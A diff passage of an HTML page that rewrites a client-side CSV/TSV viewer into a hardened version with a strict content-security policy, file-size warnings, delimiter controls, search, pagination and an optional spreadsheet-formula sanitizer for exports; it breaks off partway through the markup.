@@ -1,455 +1,761 @@
 <!DOCTYPE html>
-<html lang="en" class="h-full">
+<html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>DataLens Pro — Delimited Data Explorer</title>
-  <!-- Tailwind CSS -->
-  <script src="https://cdn.tailwindcss.com"></script>
-  <!-- Google Fonts: Inter & JetBrains Mono -->
-  <link rel="preconnect" href="https://fonts.googleapis.com">
-  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500;600&display=swap" rel="stylesheet">
-  <script>
-    tailwind.config = {
-      darkMode: 'class',
-      theme: {
-        extend: {
-          fontFamily: {
-            sans: ['Inter', 'system-ui', 'sans-serif'],
-            mono: ['JetBrains Mono', 'monospace'],
-          }
-        }
-      }
-    };
-  </script>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <!-- Strict Content Security Policy: Blocks external network calls, remote scripts, and data exfiltration -->
+  <meta http-equiv="Content-Security-Policy" content="default-src 'none'; style-src 'unsafe-inline'; script-src 'unsafe-inline'; blob:;">
+  <title>Hardened Delimited Data Explorer</title>
   <style>
-    /* Custom scrollbars for data table */
-    ::-webkit-scrollbar {
-      width: 8px;
-      height: 8px;
+    :root {
+      --bg-base: #0f172a;
+      --bg-panel: #1e293b;
+      --bg-elevated: #334155;
+      --bg-row-even: #162032;
+      --bg-row-hover: #26354d;
+      --text-main: #e2e8f0;
+      --text-muted: #94a3b8;
+      --border: #334155;
+      --accent: #38bdf8;
+      --accent-hover: #0284c7;
+      --warn-bg: #451a03;
+      --warn-border: #d97706;
+      --warn-text: #fde68a;
+      --danger-bg: #450a0a;
+      --danger-border: #dc2626;
+      --danger-text: #fecaca;
+      --ok-bg: #052e16;
+      --ok-border: #16a34a;
+      --ok-text: #bbf7d0;
     }
-    ::-webkit-scrollbar-track {
-      background: rgba(148, 163, 184, 0.1);
+
+    * { box-sizing: border-box; }
+
+    body {
+      margin: 0;
+      padding: 20px 24px;
+      font-family: system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+      background-color: var(--bg-base);
+      color: var(--text-main);
+      font-size: 14px;
+      line-height: 1.5;
     }
-    ::-webkit-scrollbar-thumb {
-      background: rgba(100, 116, 139, 0.4);
+
+    .app-header {
+      display: flex;
+      flex-wrap: wrap;
+      justify-content: space-between;
+      align-items: center;
+      gap: 12px;
+      padding-bottom: 16px;
+      border-bottom: 1px solid var(--border);
+      margin-bottom: 16px;
+    }
+
+    .app-title {
+      font-size: 18px;
+      font-weight: 700;
+      letter-spacing: 0.2px;
+      display: flex;
+      align-items: center;
+      gap: 10px;
+    }
+
+    .badge {
+      font-size: 11px;
+      font-weight: 600;
+      padding: 2px 8px;
       border-radius: 4px;
+      background: var(--ok-bg);
+      border: 1px solid var(--ok-border);
+      color: var(--ok-text);
     }
-    ::-webkit-scrollbar-thumb:hover {
-      background: rgba(100, 116, 139, 0.65);
+
+    .toolbar {
+      display: grid;
+      grid-template-columns: repeat(auto-fit, minmax(260px, 1fr));
+      gap: 12px;
+      background: var(--bg-panel);
+      border: 1px solid var(--border);
+      border-radius: 8px;
+      padding: 14px;
+      margin-bottom: 14px;
     }
-    .sort-header {
+
+    .control-group {
+      display: flex;
+      flex-direction: column;
+      gap: 6px;
+    }
+
+    .control-label {
+      font-size: 12px;
+      font-weight: 600;
+      color: var(--text-muted);
+      text-transform: uppercase;
+      letter-spacing: 0.5px;
+    }
+
+    .control-row {
+      display: flex;
+      flex-wrap: wrap;
+      gap: 6px;
+      align-items: center;
+    }
+
+    input[type="text"],
+    input[type="number"],
+    select {
+      background: var(--bg-base);
+      color: var(--text-main);
+      border: 1px solid var(--border);
+      border-radius: 6px;
+      padding: 6px 10px;
+      font-size: 13px;
+      outline: none;
+    }
+
+    input[type="text"]:focus,
+    input[type="number"]:focus,
+    select:focus {
+      border-color: var(--accent);
+    }
+
+    input[type="file"] {
+      font-size: 13px;
+      color: var(--text-muted);
+      max-width: 100%;
+    }
+
+    button {
+      background: var(--bg-elevated);
+      color: var(--text-main);
+      border: 1px solid var(--border);
+      border-radius: 6px;
+      padding: 6px 12px;
+      font-size: 13px;
+      font-weight: 500;
+      cursor: pointer;
+      transition: background 0.15s, border-color 0.15s;
+    }
+
+    button:hover:not(:disabled) {
+      background: #475569;
+      border-color: #64748b;
+    }
+
+    button:disabled {
+      opacity: 0.45;
+      cursor: not-allowed;
+    }
+
+    button.active-preset {
+      background: var(--accent-hover);
+      border-color: var(--accent);
+      color: #ffffff;
+    }
+
+    button.btn-primary {
+      background: var(--accent-hover);
+      border-color: var(--accent);
+      color: #ffffff;
+    }
+
+    button.btn-danger {
+      background: #991b1b;
+      border-color: #ef4444;
+      color: #ffffff;
+    }
+
+    .guardrail-banner {
+      display: none;
+      padding: 14px 16px;
+      border-radius: 8px;
+      margin-bottom: 14px;
+      border: 1px solid transparent;
+    }
+
+    .guardrail-banner.warn {
+      display: block;
+      background: var(--warn-bg);
+      border-color: var(--warn-border);
+      color: var(--warn-text);
+    }
+
+    .guardrail-banner.danger {
+      display: block;
+      background: var(--danger-bg);
+      border-color: var(--danger-border);
+      color: var(--danger-text);
+    }
+
+    .banner-title {
+      font-weight: 700;
+      font-size: 14px;
+      margin-bottom: 6px;
+    }
+
+    .banner-actions {
+      display: flex;
+      flex-wrap: wrap;
+      gap: 8px;
+      margin-top: 10px;
+    }
+
+    .status-bar {
+      display: flex;
+      flex-wrap: wrap;
+      justify-content: space-between;
+      align-items: center;
+      gap: 12px;
+      font-size: 12px;
+      color: var(--text-muted);
+      margin-bottom: 10px;
+      padding: 0 4px;
+    }
+
+    .status-metrics {
+      display: flex;
+      flex-wrap: wrap;
+      gap: 16px;
+    }
+
+    .metric-val {
+      color: var(--text-main);
+      font-weight: 600;
+      font-family: ui-monospace, SFMono-Regular, Menlo, Consolas, monospace;
+    }
+
+    .table-container {
+      width: 100%;
+      overflow-x: auto;
+      background: var(--bg-panel);
+      border: 1px solid var(--border);
+      border-radius: 8px;
+      max-height: 65vh;
+      overflow-y: auto;
+    }
+
+    table {
+      width: 100%;
+      border-collapse: collapse;
+      font-size: 13px;
+      table-layout: auto;
+    }
+
+    thead th {
+      position: sticky;
+      top: 0;
+      background: #1e293b;
+      color: var(--text-main);
+      border-bottom: 2px solid var(--border);
+      border-right: 1px solid var(--border);
+      padding: 10px 12px;
+      text-align: left;
+      font-weight: 600;
       user-select: none;
+      cursor: pointer;
+      white-space: nowrap;
+      z-index: 2;
+    }
+
+    thead th:hover {
+      background: var(--bg-elevated);
+    }
+
+    thead th.row-num-header {
+      width: 56px;
+      text-align: right;
+      color: var(--text-muted);
+      cursor: default;
+    }
+
+    tbody td {
+      border-bottom: 1px solid var(--border);
+      border-right: 1px solid var(--border);
+      padding: 8px 12px;
+      max-width: 380px;
+      overflow: hidden;
+      text-overflow: ellipsis;
+      white-space: nowrap;
+    }
+
+    tbody td.row-num-cell {
+      text-align: right;
+      color: var(--text-muted);
+      font-family: ui-monospace, SFMono-Regular, Menlo, Consolas, monospace;
+      font-size: 12px;
+      background: #172133;
+    }
+
+    tbody tr:nth-child(even) {
+      background: var(--bg-row-even);
+    }
+
+    tbody tr:hover {
+      background: var(--bg-row-hover);
+    }
+
+    mark {
+      background: #eab308;
+      color: #0f172a;
+      padding: 0 2px;
+      border-radius: 2px;
+      font-weight: 600;
+    }
+
+    .empty-state {
+      padding: 48px 20px;
+      text-align: center;
+      color: var(--text-muted);
+    }
+
+    .pagination-bar {
+      display: flex;
+      flex-wrap: wrap;
+      justify-content: space-between;
+      align-items: center;
+      gap: 12px;
+      margin-top: 14px;
+      padding: 10px 14px;
+      background: var(--bg-panel);
+      border: 1px solid var(--border);
+      border-radius: 8px;
+    }
+
+    .page-buttons {
+      display: flex;
+      flex-wrap: wrap;
+      gap: 4px;
+      align-items: center;
+    }
+
+    .checkbox-label {
+      display: inline-flex;
+      align-items: center;
+      gap: 6px;
+      font-size: 12px;
+      color: var(--text-muted);
+      cursor: pointer;
     }
   </style>
 </head>
-<body class="min-h-full bg-slate-50 text-slate-800 dark:bg-slate-950 dark:text-slate-100 font-sans antialiased transition-colors duration-200 flex flex-col">
+<body>
 
-  <!-- Top Navigation / Header Bar -->
-  <header class="sticky top-0 z-30 bg-white/90 dark:bg-slate-900/90 backdrop-blur border-b border-slate-200 dark:border-slate-800">
-    <div class="max-w-[1600px] mx-auto px-4 sm:px-6 py-3 flex flex-wrap items-center justify-between gap-4">
-      <!-- Brand Identity -->
-      <div class="flex items-center gap-3">
-        <div class="w-10 h-10 rounded-xl bg-indigo-600 flex items-center justify-center text-white shadow-sm shadow-indigo-500/30">
-          <svg class="w-5 h-5" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
-            <path stroke-linecap="round" stroke-linejoin="round" d="M3 10h18M3 14h18m-9-4v8m-7 0h14a2 2 0 002-2V8a2 2 0 00-2-2H5a2 2 0 00-2 2v8a2 2 0 002 2z" />
-          </svg>
-        </div>
-        <div>
-          <div class="flex items-center gap-2">
-            <h1 class="text-lg font-bold tracking-tight text-slate-900 dark:text-white">DataLens Pro</h1>
-            <span class="text-[11px] font-semibold uppercase tracking-wider px-2 py-0.5 rounded-full bg-indigo-50 text-indigo-700 dark:bg-indigo-950/80 dark:text-indigo-300 border border-indigo-200 dark:border-indigo-800">Client-Side Engine</span>
-          </div>
-          <p class="text-xs text-slate-500 dark:text-slate-400">Zero-server delimited file parser with quote-aware tokenization</p>
-        </div>
-      </div>
-
-      <!-- Quick Sample Loader & Actions -->
-      <div class="flex flex-wrap items-center gap-2.5">
-        <div class="inline-flex items-center rounded-lg bg-slate-100 dark:bg-slate-800 p-1 border border-slate-200/80 dark:border-slate-700">
-          <span class="text-xs font-medium text-slate-500 dark:text-slate-400 px-2.5">Sample Data:</span>
-          <button id="loadCsvSampleBtn" type="button" class="text-xs font-medium px-2.5 py-1.5 rounded-md bg-white dark:bg-slate-700 text-slate-800 dark:text-slate-100 shadow-sm hover:bg-indigo-50 dark:hover:bg-slate-600 transition">
-            CSV (Comma)
-          </button>
-          <button id="loadPipeSampleBtn" type="button" class="text-xs font-medium px-2.5 py-1.5 rounded-md text-slate-600 dark:text-slate-300 hover:bg-white/60 dark:hover:bg-slate-700 transition">
-            Pipe (|)
-          </button>
-          <button id="loadTabSampleBtn" type="button" class="text-xs font-medium px-2.5 py-1.5 rounded-md text-slate-600 dark:text-slate-300 hover:bg-white/60 dark:hover:bg-slate-700 transition">
-            TSV (Tab)
-          </button>
-        </div>
-
-        <button id="exportBtn" type="button" class="inline-flex items-center gap-1.5 text-xs font-semibold px-3 py-2 rounded-lg bg-white dark:bg-slate-800 border border-slate-200 dark:border-slate-700 text-slate-700 dark:text-slate-200 hover:bg-slate-50 dark:hover:bg-slate-700 transition shadow-sm" title="Download current filtered & sorted view">
-          <svg class="w-4 h-4 text-indigo-600 dark:text-indigo-400" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
-            <path stroke-linecap="round" stroke-linejoin="round" d="M4 16v1a3 3 0 003 3h10a3 3 0 003-3v-1m-4-4l-4 4m0 0l-4-4m4 4V4" />
-          </svg>
-          <span>Export View</span>
-        </button>
-
-        <!-- Theme Toggle -->
-        <button id="themeToggleBtn" type="button" class="p-2 rounded-lg bg-slate-100 dark:bg-slate-800 text-slate-600 dark:text-slate-300 hover:bg-slate-200 dark:hover:bg-slate-700 border border-slate-200 dark:border-slate-700 transition" aria-label="Toggle color theme">
-          <svg id="sunIcon" class="w-4 h-4 hidden dark:block" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
-            <path stroke-linecap="round" stroke-linejoin="round" d="M12 3v1m0 16v1m9-9h-1M4 12H3m15.364 6.364l-.707-.707M6.343 6.343l-.707-.707m12.728 0l-.707.707M6.343 17.657l-.707.707M16 12a4 4 0 11-8 0 4 4 0 018 0z" />
-          </svg>
-          <svg id="moonIcon" class="w-4 h-4 block dark:hidden" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
-            <path stroke-linecap="round" stroke-linejoin="round" d="M20.354 15.354A9 9 0 018.646 3.646 9.003 9.003 0 0012 21a9.003 9.003 0 008.354-5.646z" />
-          </svg>
-        </button>
-      </div>
+  <header class="app-header">
+    <div class="app-title">
+      <span>Delimited File Explorer</span>
+      <span class="badge">Memory &amp; XSS Guardrails Active</span>
+    </div>
+    <div class="control-row">
+      <button id="loadDemoBtn" type="button">Load Security Test Dataset</button>
+      <label class="checkbox-label" title="Prefixes =, +, -, @ with a single quote on CSV export to block spreadsheet execution">
+        <input type="checkbox" id="sanitizeExportToggle" checked>
+        Sanitize Formula Export
+      </label>
+      <button id="exportBtn" type="button" class="btn-primary" disabled>Export View</button>
     </div>
   </header>
 
-  <!-- Main Workspace -->
-  <main class="flex-1 max-w-[1600px] w-full mx-auto px-4 sm:px-6 py-5 flex flex-col gap-5">
-
-    <!-- Top Control Grid: File Dropzone + Delimiter Configuration -->
-    <section class="grid grid-cols-1 lg:grid-cols-12 gap-4">
-      
-      <!-- File Ingestion Card (Drag & Drop + Browse) -->
-      <div id="dropZone" class="lg:col-span-5 bg-white dark:bg-slate-900 rounded-xl border-2 border-dashed border-slate-300 dark:border-slate-700 hover:border-indigo-500 dark:hover:border-indigo-500 transition-all p-4 flex flex-col justify-between cursor-pointer group relative overflow-hidden">
-        <input type="file" id="fileInput" accept=".csv,.tsv,.txt,.dat,.log" class="hidden" />
-        <div class="flex items-start gap-3.5">
-          <div class="w-11 h-11 rounded-xl bg-indigo-50 dark:bg-indigo-950/70 text-indigo-600 dark:text-indigo-400 flex items-center justify-center shrink-0 group-hover:scale-105 transition-transform">
-            <svg class="w-6 h-6" fill="none" stroke="currentColor" stroke-width="1.8" viewBox="0 0 24 24">
-              <path stroke-linecap="round" stroke-linejoin="round" d="M7 16a4 4 0 01-.88-7.903A5 5 0 1115.9 6L16 6a5 5 0 011 9.9M15 13l-3-3m0 0l-3 3m3-3v12" />
-            </svg>
-          </div>
-          <div class="min-w-0 flex-1">
-            <div class="flex items-center gap-2">
-              <p class="text-sm font-semibold text-slate-900 dark:text-white truncate" id="fileNameDisplay">enterprise_revenue_sample.csv</p>
-              <span id="fileSizeBadge" class="text-[11px] font-mono px-2 py-0.5 rounded bg-slate-100 dark:bg-slate-800 text-slate-600 dark:text-slate-400">2.4 KB</span>
-            </div>
-            <p class="text-xs text-slate-500 dark:text-slate-400 mt-0.5">
-              Drag & drop any delimited text file here, or <span class="text-indigo-600 dark:text-indigo-400 font-medium underline">click to browse</span>
-            </p>
-          </div>
-        </div>
-        <div class="mt-3 pt-2.5 border-t border-slate-100 dark:border-slate-800/80 flex items-center justify-between text-xs text-slate-500 dark:text-slate-400">
-          <span>Supports <code class="font-mono text-slate-700 dark:text-slate-300">.csv</code>, <code class="font-mono text-slate-700 dark:text-slate-300">.tsv</code>, <code class="font-mono text-slate-700 dark:text-slate-300">.txt</code>, custom logs</span>
-          <span class="inline-flex items-center gap-1 text-emerald-600 dark:text-emerald-400 font-medium">
-            <span class="w-1.5 h-1.5 rounded-full bg-emerald-500"></span> 100% Local Processing
-          </span>
-        </div>
+  <section class="toolbar">
+    <!-- 1. File Upload Control -->
+    <div class="control-group">
+      <span class="control-label">1. Source File (Warn &gt;10MB, Stop &gt;50MB)</span>
+      <div class="control-row">
+        <input type="file" id="fileInput" accept=".csv,.tsv,.txt,.log,.dat">
       </div>
+    </div>
 
-      <!-- Delimiter Variable & Configuration Card -->
-      <div class="lg:col-span-7 bg-white dark:bg-slate-900 rounded-xl border border-slate-200 dark:border-slate-800 p-4 shadow-sm flex flex-col justify-between">
-        <div class="flex flex-wrap items-center justify-between gap-2 mb-3">
-          <div>
-            <h2 class="text-sm font-semibold text-slate-900 dark:text-white flex items-center gap-2">
-              <span>Delimiter Configuration</span>
-              <code class="text-xs font-mono px-2 py-0.5 rounded bg-indigo-50 dark:bg-indigo-950 text-indigo-700 dark:text-indigo-300 border border-indigo-200/60 dark:border-indigo-800/70" id="jsVariablePreview">activeDelimiter = ","</code>
-            </h2>
-            <p class="text-xs text-slate-500 dark:text-slate-400">Choose a standard preset or enter any custom character/string separator</p>
-          </div>
-          <button id="autoDetectBtn" type="button" class="inline-flex items-center gap-1.5 text-xs font-medium px-2.5 py-1.5 rounded-lg bg-indigo-50 dark:bg-indigo-950/80 text-indigo-700 dark:text-indigo-300 hover:bg-indigo-100 dark:hover:bg-indigo-900/70 border border-indigo-200/70 dark:border-indigo-800 transition">
-            <svg class="w-3.5 h-3.5" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
-              <path stroke-linecap="round" stroke-linejoin="round" d="M13 10V3L4 14h7v7l9-11h-7z" />
-            </svg>
-            Auto-Detect Delimiter
-          </button>
-        </div>
-
-        <div class="grid grid-cols-1 sm:grid-cols-12 gap-3 items-center">
-          <!-- Preset Delimiter Buttons -->
-          <div class="sm:col-span-7 flex flex-wrap gap-1.5" role="group" aria-label="Delimiter Presets">
-            <button type="button" data-delimiter="," class="delimiter-preset-btn flex-1 min-w-[78px] text-xs font-medium py-2 px-2.5 rounded-lg border transition flex flex-col items-center justify-center gap-0.5">
-              <span>Comma</span>
-              <code class="font-mono text-[11px] opacity-75">,</code>
-            </button>
-            <button type="button" data-delimiter="&#9;" class="delimiter-preset-btn flex-1 min-w-[78px] text-xs font-medium py-2 px-2.5 rounded-lg border transition flex flex-col items-center justify-center gap-0.5">
-              <span>Tab</span>
-              <code class="font-mono text-[11px] opacity-75">\t</code>
-            </button>
-            <button type="button" data-delimiter=";" class="delimiter-preset-btn flex-1 min-w-[78px] text-xs font-medium py-2 px-2.5 rounded-lg border transition flex flex-col items-center justify-center gap-0.5">
-              <span>Semicolon</span>
-              <code class="font-mono text-[11px] opacity-75">;</code>
-            </button>
-            <button type="button" data-delimiter="|" class="delimiter-preset-btn flex-1 min-w-[78px] text-xs font-medium py-2 px-2.5 rounded-lg border transition flex flex-col items-center justify-center gap-0.5">
-              <span>Pipe</span>
-              <code class="font-mono text-[11px] opacity-75">|</code>
-            </button>
-            <button type="button" data-delimiter=":" class="delimiter-preset-btn flex-1 min-w-[78px] text-xs font-medium py-2 px-2.5 rounded-lg border transition flex flex-col items-center justify-center gap-0.5">
-              <span>Colon</span>
-              <code class="font-mono text-[11px] opacity-75">:</code>
-            </button>
-          </div>
-
-          <!-- Custom Delimiter Input -->
-          <div class="sm:col-span-5">
-            <label for="customDelimiterInput" class="block text-[11px] font-medium text-slate-500 dark:text-slate-400 mb-1">
-              Custom Delimiter Input (Live Override):
-            </label>
-            <div class="relative flex items-center">
-              <input
-                type="text"
-                id="customDelimiterInput"
-                value=","
-                maxlength="10"
-                placeholder="Type delimiter (e.g. , | :: \t)"
-                class="w-full font-mono text-sm pl-3 pr-20 py-1.5 rounded-lg bg-slate-50 dark:bg-slate-800 border border-slate-300 dark:border-slate-700 text-slate-900 dark:text-white focus:outline-none focus:ring-2 focus:ring-indigo-500 focus:border-indigo-500 transition"
-              />
-              <span id="customDelimiterBadge" class="absolute right-2 text-[11px] font-mono px-1.5 py-0.5 rounded bg-slate-200 dark:bg-slate-700 text-slate-700 dark:text-slate-300 pointer-events-none">
-                ASCII 44
-              </span>
-            </div>
-          </div>
-        </div>
+    <!-- 2. Explicit Delimiter Variable Control -->
+    <div class="control-group">
+      <span class="control-label">2. Delimiter Variable (<code id="delimVarDisplay">activeDelimiter = ","</code>)</span>
+      <div class="control-row">
+        <button type="button" class="delim-preset active-preset" data-delim=",">Comma (,)</button>
+        <button type="button" class="delim-preset" data-delim="&#9;">Tab (\t)</button>
+        <button type="button" class="delim-preset" data-delim=";">Semi (;)</button>
+        <button type="button" class="delim-preset" data-delim="|">Pipe (|)</button>
+        <input type="text" id="customDelimInput" value="," maxlength="10" style="width: 70px;" title="Custom delimiter string (max 10 chars)">
+        <button type="button" id="autoDetectBtn" title="Scan first 20 lines to infer delimiter">Auto</button>
       </div>
-    </section>
+    </div>
 
-    <!-- Summary Metrics & Search Toolbar -->
-    <section class="bg-white dark:bg-slate-900 rounded-xl border border-slate-200 dark:border-slate-800 p-4 shadow-sm flex flex-col lg:flex-row items-stretch lg:items-center justify-between gap-4">
-      
-      <!-- Global Search Input -->
-      <div class="relative flex-1 max-w-xl">
-        <svg class="w-4 h-4 text-slate-400 absolute left-3.5 top-1/2 -translate-y-1/2 pointer-events-none" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
-          <path stroke-linecap="round" stroke-linejoin="round" d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z" />
-        </svg>
-        <input
-          type="text"
-          id="searchInput"
-          placeholder="Search across all rows and columns (press '/' to focus)..."
-          class="w-full pl-10 pr-28 py-2 text-sm rounded-lg bg-slate-50 dark:bg-slate-800/90 border border-slate-200 dark:border-slate-700 text-slate-900 dark:text-slate-100 placeholder-slate-400 focus:outline-none focus:ring-2 focus:ring-indigo-500 focus:bg-white dark:focus:bg-slate-800 transition"
-        />
-        <div class="absolute right-2 top-1/2 -translate-y-1/2 flex items-center gap-1.5">
-          <span id="searchMatchBadge" class="hidden text-[11px] font-medium px-2 py-0.5 rounded-full bg-indigo-50 dark:bg-indigo-950 text-indigo-700 dark:text-indigo-300 border border-indigo-200 dark:border-indigo-800">
-            0 matches
-          </span>
-          <button id="clearSearchBtn" type="button" class="hidden p-1 text-slate-400 hover:text-slate-600 dark:hover:text-slate-200 rounded" title="Clear search">
-            <svg class="w-4 h-4" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
-              <path stroke-linecap="round" stroke-linejoin="round" d="M6 18L18 6M6 6l12 12" />
-            </svg>
-          </button>
-        </div>
+    <!-- 3. Search & Pagination Size -->
+    <div class="control-group">
+      <span class="control-label">3. Global Search &amp; Page Density</span>
+      <div class="control-row">
+        <input type="text" id="searchInput" placeholder="Filter across all columns..." style="flex: 1; min-width: 160px;">
+        <button type="button" id="clearSearchBtn" title="Clear search filter">Clear</button>
+        <select id="pageSizeSelect" title="Rows rendered per page">
+          <option value="10">10 / page</option>
+          <option value="25" selected>25 / page</option>
+          <option value="50">50 / page</option>
+          <option value="100">100 / page</option>
+          <option value="250">250 / page</option>
+        </select>
       </div>
+    </div>
+  </section>
 
-      <!-- Telemetry / Summary Statistics Pills -->
-      <div class="flex flex-wrap items-center gap-2 sm:gap-3">
-        <div class="px-3 py-1.5 rounded-lg bg-slate-50 dark:bg-slate-800/70 border border-slate-200/80 dark:border-slate-700/80 flex items-center gap-2">
-          <span class="text-xs text-slate-500 dark:text-slate-400">Total Rows:</span>
-          <span id="statTotalRows" class="text-xs font-bold font-mono text-slate-900 dark:text-white">0</span>
-        </div>
-
-        <div class="px-3 py-1.5 rounded-lg bg-slate-50 dark:bg-slate-800/70 border border-slate-200/80 dark:border-slate-700/80 flex items-center gap-2">
-          <span class="text-xs text-slate-500 dark:text-slate-400">Filtered:</span>
-          <span id="statFilteredRows" class="text-xs font-bold font-mono text-indigo-600 dark:text-indigo-400">0</span>
-        </div>
-
-        <div class="px-3 py-1.5 rounded-lg bg-slate-50 dark:bg-slate-800/70 border border-slate-200/80 dark:border-slate-700/80 flex items-center gap-2">
-          <span class="text-xs text-slate-500 dark:text-slate-400">Columns:</span>
-          <span id="statColumns" class="text-xs font-bold font-mono text-slate-900 dark:text-white">0</span>
-        </div>
-
-        <div class="px-3 py-1.5 rounded-lg bg-slate-50 dark:bg-slate-800/70 border border-slate-200/80 dark:border-slate-700/80 flex items-center gap-2">
-          <span class="text-xs text-slate-500 dark:text-slate-400">Delimiter:</span>
-          <code id="statActiveDelimiter" class="text-xs font-bold font-mono px-1.5 py-0.2 rounded bg-indigo-100/80 dark:bg-indigo-950 text-indigo-700 dark:text-indigo-300">","</code>
-        </div>
-
-        <button id="resetSortBtn" type="button" class="hidden text-xs font-medium px-2.5 py-1.5 rounded-lg bg-amber-50 dark:bg-amber-950/60 text-amber-700 dark:text-amber-300 border border-amber-200 dark:border-amber-800/80 hover:bg-amber-100 transition">
-          Reset Sort
-        </button>
-      </div>
-    </section>
-
-    <!-- Data Table Container -->
-    <section class="flex-1 bg-white dark:bg-slate-900 rounded-xl border border-slate-200 dark:border-slate-800 shadow-sm overflow-hidden flex flex-col min-h-[420px]">
-      
-      <!-- Scrollable Table Viewport -->
-      <div class="overflow-x-auto overflow-y-auto max-h-[62vh] flex-1 relative">
-        <table class="w-full text-left border-collapse">
-          <thead id="tableHead" class="sticky top-0 z-20 bg-slate-100/95 dark:bg-slate-800/95 backdrop-blur border-b border-slate-200 dark:border-slate-700 text-xs font-semibold uppercase tracking-wider text-slate-600 dark:text-slate-300">
-            <!-- Dynamically populated column headers -->
-          </thead>
-          <tbody id="tableBody" class="divide-y divide-slate-200/70 dark:divide-slate-800 text-sm">
-            <!-- Dynamically populated data rows -->
-          </tbody>
-        </table>
-
-        <!-- Empty State Overlay -->
-        <div id="emptyState" class="hidden py-16 px-4 text-center">
-          <div class="w-12 h-12 rounded-full bg-slate-100 dark:bg-slate-800 mx-auto flex items-center justify-center text-slate-400 mb-3">
-            <svg class="w-6 h-6" fill="none" stroke="currentColor" stroke-width="1.8" viewBox="0 0 24 24">
-              <path stroke-linecap="round" stroke-linejoin="round" d="M9.172 16.172a4 4 0 015.656 0M9 10h.01M15 10h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z" />
-            </svg>
-          </div>
-          <h3 class="text-sm font-semibold text-slate-800 dark:text-slate-200">No matching records found</h3>
-          <p class="text-xs text-slate-500 dark:text-slate-400 mt-1 max-w-sm mx-auto">
-            Try clearing your search filter or verifying that the active delimiter matches your source file structure.
-          </p>
-        </div>
-      </div>
-
-      <!-- Full Pagination Footer Bar -->
-      <div class="bg-slate-50/90 dark:bg-slate-900/90 border-t border-slate-200 dark:border-slate-800 px-4 py-3 flex flex-wrap items-center justify-between gap-4">
-        
-        <!-- Left: Showing X to Y of Z & Rows Per Page -->
-        <div class="flex flex-wrap items-center gap-4 text-xs text-slate-600 dark:text-slate-400">
-          <div id="paginationRangeText">
-            Showing <span class="font-semibold text-slate-900 dark:text-white">0</span> to <span class="font-semibold text-slate-900 dark:text-white">0</span> of <span class="font-semibold text-slate-900 dark:text-white">0</span> rows
-          </div>
-
-          <div class="flex items-center gap-2">
-            <label for="pageSizeSelect" class="text-xs text-slate-500 dark:text-slate-400">Rows per page:</label>
-            <select id="pageSizeSelect" class="text-xs font-medium rounded-lg bg-white dark:bg-slate-800 border border-slate-300 dark:border-slate-700 text-slate-800 dark:text-slate-200 px-2.5 py-1.5 focus:outline-none focus:ring-2 focus:ring-indigo-500">
-              <option value="10" selected>10</option>
-              <option value="25">25</option>
-              <option value="50">50</option>
-              <option value="100">100</option>
-              <option value="250">250</option>
-            </select>
-          </div>
-        </div>
-
-        <!-- Right: Interactive Pagination Buttons -->
-        <div class="flex items-center gap-1.5" role="navigation" aria-label="Pagination">
-          <button id="firstPageBtn" type="button" class="px-2.5 py-1.5 rounded-lg text-xs font-medium bg-white dark:bg-slate-800 border border-slate-200 dark:border-slate-700 text-slate-700 dark:text-slate-300 hover:bg-slate-100 dark:hover:bg-slate-700 disabled:opacity-40 disabled:pointer-events-none transition" title="First Page">
-            &laquo; First
-          </button>
-          <button id="prevPageBtn" type="button" class="px-2.5 py-1.5 rounded-lg text-xs font-medium bg-white dark:bg-slate-800 border border-slate-200 dark:border-slate-700 text-slate-700 dark:text-slate-300 hover:bg-slate-100 dark:hover:bg-slate-700 disabled:opacity-40 disabled:pointer-events-none transition" title="Previous Page">
-            &lsaquo; Prev
-          </button>
-
-          <!-- Dynamic Page Numbers Container -->
-          <div id="pageNumbersContainer" class="hidden sm:flex items-center gap-1 px-1"></div>
-
-          <button id="nextPageBtn" type="button" class="px-2.5 py-1.5 rounded-lg text-xs font-medium bg-white dark:bg-slate-800 border border-slate-200 dark:border-slate-700 text-slate-700 dark:text-slate-300 hover:bg-slate-100 dark:hover:bg-slate-700 disabled:opacity-40 disabled:pointer-events-none transition" title="Next Page">
-            Next &rsaquo;
-          </button>
-          <button id="lastPageBtn" type="button" class="px-2.5 py-1.5 rounded-lg text-xs font-medium bg-white dark:bg-slate-800 border border-slate-200 dark:border-slate-700 text-slate-700 dark:text-slate-300 hover:bg-slate-100 dark:hover:bg-slate-700 disabled:opacity-40 disabled:pointer-events-none transition" title="Last Page">
-            Last &raquo;
-          </button>
-        </div>
-      </div>
-    </section>
-  </main>
-
-  <!-- Toast Notification Banner -->
-  <div id="toastNotification" class="fixed bottom-5 right-5 z-50 transform translate-y-16 opacity-0 pointer-events-none transition-all duration-300 bg-slate-900 dark:bg-slate-800 text-white px-4 py-2.5 rounded-xl shadow-lg border border-slate-700 flex items-center gap-2.5 text-xs font-medium">
-    <span class="w-2 h-2 rounded-full bg-emerald-400"></span>
-    <span id="toastMessage">Action completed</span>
+  <!-- Dynamic Guardrail Banner for Oversize Files or Truncation Warnings -->
+  <div id="guardrailBanner" class="guardrail-banner" role="alert">
+    <div id="bannerTitle" class="banner-title"></div>
+    <div id="bannerDesc"></div>
+    <div id="bannerActions" class="banner-actions"></div>
   </div>
 
-  <!-- Application Logic -->
+  <!-- Telemetry & Security Metrics Bar -->
+  <div class="status-bar">
+    <div class="status-metrics">
+      <span>File: <span id="metaFileName" class="metric-val">None</span></span>
+      <span>Size: <span id="metaFileSize" class="metric-val">0 B</span></span>
+      <span>Delimiter: <span id="metaDelimiter" class="metric-val">","</span></span>
